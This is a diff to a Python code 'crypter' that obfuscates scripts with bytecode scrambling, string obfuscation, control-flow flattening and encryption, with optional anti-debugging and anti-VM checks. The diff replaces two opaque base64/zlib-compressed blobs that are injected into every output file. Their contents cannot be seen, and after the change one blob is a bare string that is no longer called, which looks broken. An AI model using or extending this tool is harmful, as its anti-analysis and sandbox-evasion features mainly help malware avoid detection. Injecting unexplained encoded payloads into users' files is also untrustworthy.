@@ -1,18 +1,19 @@
-import base64
-import marshal
-import os
-import re
-import zlib
 import ast
-import sys
-import uuid
+import base64
+import dis
+import marshal
 import math
+import os
 import random
+import re
+import sys
+import types
+import uuid
+import zlib
+
+import bytecode
 from colorama import Fore, init
 from cryptography.fernet import Fernet
-import dis
-import types
-import bytecode
 
 init(autoreset=True)
 # You can customize it to create your own stub code
@@ -121,9 +122,7 @@ def obfuscate_bytecode_layer(co: types.CodeType, *, seed: int = None) -> types.C
         bc.flags = co.co_flags
         final_co = bc.to_code()
     except Exception as e:
-        print(
-            f"[{Fore.YELLOW}!{Fore.RESET}] Obfuscation bytecode error: {e}"
-        )
+        print(f"[{Fore.YELLOW}!{Fore.RESET}] Obfuscation bytecode error: {e}")
         final_co = co
     return final_co
 
@@ -340,6 +339,7 @@ def obfuscate_strings(code):
     except Exception as e:
         print(f"[{Fore.YELLOW}!{Fore.RESET}] String obfuscation failed: {e}")
         import traceback
+
         traceback.print_exc()
         return code
 
@@ -380,8 +380,16 @@ def obfuscate_code(code):
     )
     final_import_calls = "\n" + final_import_calls
     try:
-        enable_anti_debug = input("Enable anti-debugging? (y/n): ").strip().lower()
-        enable_anti_vm = input("Enable anti-VM? (y/n): ").strip().lower()
+        enable_anti_debug = (
+            input(f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enable anti-debugging? (y/n): ")
+            .strip()
+            .lower()
+        )
+        enable_anti_vm = (
+            input(f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enable anti-VM? (y/n): ")
+            .strip()
+            .lower()
+        )
         if sys.version_info < (3, 11):
             print(
                 f"[{Fore.YELLOW}!{Fore.RESET}] Control flow flattening requires Python 3.11+ to work properly."
@@ -397,13 +405,23 @@ def obfuscate_code(code):
             enable_bytecode_obf = "n"
         else:
             enable_flatten = (
-                input("Enable control flow flattening? (y/n): ").strip().lower()
+                input(
+                    f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enable control flow flattening? (y/n): "
+                )
+                .strip()
+                .lower()
             )
             enable_string_obf = (
-                input("Enable string obfuscation? (y/n): ").strip().lower()
+                input(
+                    f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enable string obfuscation? (y/n): "
+                )
+                .strip()
+                .lower()
             )
             enable_bytecode_obf = (
-                input("Enable bytecode obfuscation (shuffle constants)? (y/n): ")
+                input(
+                    f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enable bytecode obfuscation (shuffle constants)? (y/n): "
+                )
                 .strip()
                 .lower()
             )
@@ -412,13 +430,21 @@ def obfuscate_code(code):
         sys.exit(0)
     if enable_anti_vm in ["y", "yes"]:
         final_import_calls += (
-            ("" if len(final_import_calls) == 1 and final_import_calls[0] == "\n" else "\n")
-            + "_x(b'eJzNVm1v2zYQ7pd98f6EvkkCHEFJmmI1kAGuIy9G4pfarrMhMARaOtmEJVEgKb+gzX/fUZRlOcuaAOuwCYl1PJ4eHu+5O1L89PO7dw2aZIxLY0tTDstGI4TIoMLfJJbdahj4SL7XgnpYLrNcGteGyBcZZwEI4QQrCNa+nrEqS/U8mtuEBmbTMAOW4CxwsRcSEqVZglSvhIUQm/PmyXeQBiyk6fLazGV09ot5OitpArja9eWpOuBAJGVpFJOluK751xl77annD4b+Q29wM3w4fmZXEo0Mku6tTWLQ9LDJiHFDKx5PFjJnlMucxMr9WX9LOBSSVn5iOzW63WfAz2ZK/Oz1v6j33ayvXiPCSRxDLMwKdG63ThbgIHOeGlOeQ6GHXQCZNKz6nhRGONIjj3PGm3VKpjpE3i6jHMIafEaEaPxzWpG8hAT/C9oWjMUWB0cA4cHK4qblui33qvXh4zcldFoXhXCFfx+UcN5pnb8vpi5b3e43bey6NnKj92r/F2xkRK4Exv+YaZHZaX1lAveVPSHykpPE6NIYxEGpU+90ZEwxGqIW+FdRhpwE8RGlSmLjtxyENNphSBU7f4f5QNOQbSu0SVHelxeHccjpBou+gkfgAtfBPvDDEPssF/BDESfd78C9GMZyjXaWVao+DTgTLJJOOTkhabhgO7/EnTfKDFaNB79RKeDAjgopLCXbRQNSkmpBRYLUUqeelX+t50NdBBL7kHCwt4dx7KyBpxBfXjg9UeYq412svpzDiIOAVFoXH9+a/m0pOV1gTy/zfTgphNd7zau+3cAiXy6BH3z6NzwSufBVeaqa+1rNm5tEqgIKa9SbG+RMAN/QAOrqLdayWBG+risjGoYx8LpKaNbpycdlZ1iRYF1ZPxW/W4p8T1fYFMMRuuLtIMgl45ZtEIE71aPjjqJcsXe6Cx0TbelgG0qotGKSLEJiqHVbxa9D04g52MctMyVJcYKZthOzLeBazcLE1pYnuEVKorJISZFLGjvlXnyKx7v1qNHmxxb99PyM1S476HUeI7kK6ciGwtcGSl/u7jv8azIl4dJX5wvGQb0cPHwjP2B5qnzSvihkX4Fyki7BOvdd11X/z9Oj9PQFGOOsvtKvhutcvbUe17BH1/QVyxlmkN7B3iqHt3feH/79sNO+9/vtzm1v4DWx39y2xzcP7bF36CY33qQz7o2mveHgtJGZx1AvKEMakNfjWp9z4PsZiXPwdhZ6gTTrzz6h7QzbHvZ203505y/fhI6ItcsQXnqUZ8Wlpzeefmnf1685v3sD820XmpfqsrTsklhgHBv02V20vKsyoaqBsYotFB0fe6dEcyNlykKPa1ecg8pydcTq4z8Bk/lPjA==')"
+            (
+                ""
+                if len(final_import_calls) == 1 and final_import_calls[0] == "\n"
+                else "\n"
+            )
+            + "_x(b'eJzNV+9u2zYQ7+d82DMI2odKQCK4SZqtBjJA8Z/ZqB27tpu0SAKBlmiZMCVqJOU/a/sQe4E9xp5nj7IjRduSm6HZ1mEzEvN4PP70093xjha/fPPs2VGEZxYRwTJx3PqRBZ8MybmwLq07PVMfPrM/MOHFWOJ06Twfb4TESZOTJX7ufrofchZzlFhtQrG4v+mvEMdmsCaMUWEf/y2kAUchBSTCZY7oFVtbP+ZYSMuPIiIJS5+Oe0vSiK3EfaE+O72P1AoHsoCqQT2x+UpwfZYL/PXgxu2/hFX1oEH2s0zc90nImWAz6RntGKXRlK0Dg/2gv5dJNfK28X6JgF2EtqLZhais7WwyzE9uyqo3rf7b8vz1Tb88HSKOKMWVjLGvWDivKN7htML5999+DTLOQs3c+tYSubDUHAuBhVrdb21O4yXBK/vYsru9cbZRwrAw7aBwgblSjKcENySnW3m8DLWIw5wTuelgROVc+Z0jDXDb7/pNf6hElEvGc5WZezmsvEzOs3FOJFYWDUTSYuRTll5RYKCm4VR/J5EamjhkUcErSg1jvMSpXK60sk2iiBbrM04idCIwXxbzONJAcaKmpbAwtmitM8p4YdaRMvNTRDc/Y37z3VbTxNM8jjF/21UaADbDxbkR4u240/y0HXca7ej1xXk0je09AbVQmHSTJE/BpduHKd1CRHmSFXIiQpbOiH5UimXCUiMJiaQSGaUbBQ4ibJkZg4yt4PjMMaWPxHfPQ+fIOtM7CrFgpSYGieMYQ7Ex4l7JSWYomlNEdEBFOJdILHT4VRwIPFjLCeJShBzvMlcTEOtcEs0RjrgBV/spEXIrJ7F+jAyzbeLqqlCA6+wjHIs54otikkZIJEpcgVh4ZpUQncDrs1OtKR0dyTf1HR+WyyyXcIhEPjXnxwvnOFwExYqzs1Sfux1uyBJYBY/rUqRTDmv+CWQutR+OK/twCglN0vjSzuXs5Hu7uipJguFpl2dVNbgOqZI/oygWlyV+jVHLn7SC60Fw271uDm7329ydRGYWSjdV9svEIql548rCjHGzCKVwD1avGHEsc55aE55jrcfrEGfScsrEVCGLTO61OGf8uOzXSfGecA4hfFEJPkNC/PPQQAASFP4vXD+FG4Bz4D1PYMTDeVWtl2ynVqvXXtYvXn1UQqN+qoWX8HehhBeN+otzvXRWb7c/Fsa1mgvp9kgw3f8ygCbtoFerC5WH13CqhaNkV2eZklSe6etWCeCQWyURtg4NJTRX4alDTqkHhS3F9OzU6wpDmPE2hC3neAjVAbqFc/rKfaIPfCk5mcKBNi89GGvhizn6RWrbKr+l9C8QWhHw6WQOKRsNgUtrDT0burDjWkgAXjHb75vlykXq3vChelCMpQcBT4h0KEqmEdKXirr+9kg6Y+oO5tgpSnQdtl2Pqr7juMfaxC0sPysuSqnDLlTx90w+BXAl4M5dgfawz9tPh1WsoOwB65yCCxXS/v6j8AsDpTdv9wUvQyvlMlCHH9ygBk910iBkeaooFVQUcKAwOUpj7LwIarWa+v+TvH8ExjopP+kHq+a9fGLKL/AGmEE6Qd/1BhlOX+ONY6ad1633QW/Q8HtB3290utetY6ghHX/UvPVHrftma9wYdYeT7uDa3K7tvWunhIHbIY579Dc55psbRHPcWjvwXNXf9bYrsL2BDgd10Hbvag+HUSk6xg7Ry9X1wHFL3eSuEgS4QyuCBxUYWvvg3We67mjy1u89snJwmda6d63rQ1Xn/bA1qlzDtXroj/xer9UbHy5cDRqdsvLhScf0kUQwhm1EBT4iBz8ySZIxLi1WmEKRDKBASqfmHv0BzPAy4g==')"
         )
     if enable_anti_debug in ["y", "yes"]:
         final_import_calls += (
-            ("" if len(final_import_calls) == 1 and final_import_calls[0] == "\n" else "\n")
-            + "_x(b'eJyVVllv4zYQ3uf0PxTqvkgGUmcvbIEF8uAcixjYtEGdZgsEgaBjJBOmSJakbKtF/3uHknnIsQ1UDwK/meFcJGdG/fjDmzdnJVQRUWkJeVvXIFMhQQHTyeTLWYTfQCesThtethRUdBn903PMF4syj8897KVFF5JEV8K6DClkb1OOsEf/9n9SvTY6JUyDVFBowlmiOjXdMXZemk+CbiWLHmULZ1bRMlOZ1tLsOI/iGnCdFRBPooyVkVFjSckEkxAxrqNfOYMTSrXsPPeVhRT1VTJrQhOOlryfTKu0N3fY2L5Bg2FbgNBRMkMjJG813ErJ5Xn0lNF2WAcpEJlSLnaupgytRpeXUcx07KVGIeyEC90JTPOGsJLS6QokA/rxw3Subnb34mF8LU65HLo9bwSXeufzOIY9TUd9F1yR7Sn3N0QvIy6AJfGFkLy4UECrC6Uz3SpzDiqqXjtdcRlRwvAk2CH2zg8jMUVNUitjJYkfzenJB1J+iQ9kItiJFzYZdgtKMG3P718m0U+X0bvju47lcv/LJWSr15n+7dTNMF+fYbPofznNilVKidL4op+d4NubvP5zulgCpW/Pe7QmsJnCFgycf1uIzoJ7cd2Uv7fMYXUvbllt4QMeBSh1h2ZAWuIiJ3CtJQ3xYl04iFcMk0ZnNS72iXdABcgFyDUpYGB6t63QH3O77fv9fHYze7AwazWXLVP72Nm+aqVYtESDJVxnhPm1zDm7MjmzpCJ3zMXXjBac7ftk6decadTls2AZo1iQ3BlCINbhdXPpvoGCl55ZsuAoYI3hrzeO+ZWUJfWylSRl9rMaKa9L53/dWLL3/Y7z1e1WUC79ljutxYxltPsb5NMvIdVWCZ99NBgsP38KQB2uR5y/wvWIs9n3z9C8xLxpWkZ0Z/2w9JUq20Z43CjMekWcBwx0w1mATNWwkFPalbmTRTVVIHzgenvvTBmCrXBbB+j9NYRAl4QaSqIDOGZKIoIgFthZcr4l7t6oYqkztRqutndCbVtN3EvDVhQoNfLm7Ye4qZ0JXYjw2T9d8e3eXf1OsCEsM7nyBFZmqrHQdBKfu01D3DvbfvzgON7Z7edPltoTX4ZegC+U4RxgSpToW0IymVK+AYkN25RwYeq3UH2gYjiRFJ+wTJ5jIx2/TF56Pb0s8o24r3yjTm7YTjeK7Uzv1VBpCrsRnRxt20MT6xtflLeEYl3adbailRIfaopRFhiSZZqoC9f7zFxgp4pwgxkv0iKjNE2xq2E8x4WwThihw2OMwaMeqngrC0grQrHhYuRK4JxlJqOBYegjG5Mwa+Hm/zvUPOLM0TeqQxPMbg8WSoUpPSMnp9Rdtrky3Z5z5eYIHCTQZ6KtbxZ7i04keTcEFuL/ABuiSfQ=')"
+            (
+                ""
+                if len(final_import_calls) == 1 and final_import_calls[0] == "\n"
+                else "\n"
+            )
+            + "eJyFUk1LxDAQXTz2Vww9pbAUP26CB0GFvYgH8SJS0mZag20SJlPd+utN26zuslXnksc85r2XSfznyWqVKKxB+0Jh2TcNUuEIPRoW2WUCoea+Nk3RWdW36OEKnlOnynQN6US6YYRuUPiuRqQjWYbjZdLQ9bFMrg0jeaxYWyP84PNIRN+xCLknA4/U407nVXrJTONAsGgwYFlhmoE0CkaVXUtk4VZgLMO9Nfi7JtPwQx4ZFEGuJtntO3z3xFmW18Xktuy15IfbCh2DuA4muuwZb4ksreFJtv2M9xbgpPeLKSseXNjhhzaqbfM3JIPtxXm+8TfxGR8OX/G/NJvOWeIY5TDaUpwocydbj4n+8//oSRnsPGjD+nCrWZxmyRc4r8X+')"
         )
     if enable_flatten in ["y", "yes"]:
         code_to_process = flatten_control_flow(code_to_process)
@@ -449,7 +475,7 @@ def obfuscate_code(code):
         final_import_calls if final_import_calls else "",
         repr(final_data),
         str(list(mask_key)).replace(" ", ""),
-        str(list(masked_key)).replace(" ", "")
+        str(list(masked_key)).replace(" ", ""),
     )
 
 
@@ -465,7 +491,7 @@ if __name__ == "__main__":
         f"[{Fore.YELLOW}!{Fore.RESET}] Python 3.11+ is recommended for maximum effectiveness."
     )
     print(
-        f"[{Fore.YELLOW}!{Fore.RESET}] Anti-VM detection is only effective on Windows virtual machines."
+        f"[{Fore.YELLOW}!{Fore.RESET}] Code obfuscation by {Fore.LIGHTRED_EX}0BeeF{Fore.RESET} only runs on Windows machines."
     )
     if sys.version_info < (3, 11):
         print(
@@ -473,7 +499,9 @@ if __name__ == "__main__":
         )
     try:
         file_path = (
-            input("Enter the path to the .py file you want to obfuscate: ")
+            input(
+                f"[{Fore.LIGHTCYAN_EX}?{Fore.RESET}] Enter the path to the '.py' file you want to obfuscate: "
+            )
             .strip()
             .strip("'\"")
         )
@@ -492,4 +520,3 @@ if __name__ == "__main__":
     print(
         f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Crypted file created: {os.path.abspath(output_filename)}"
     )
-
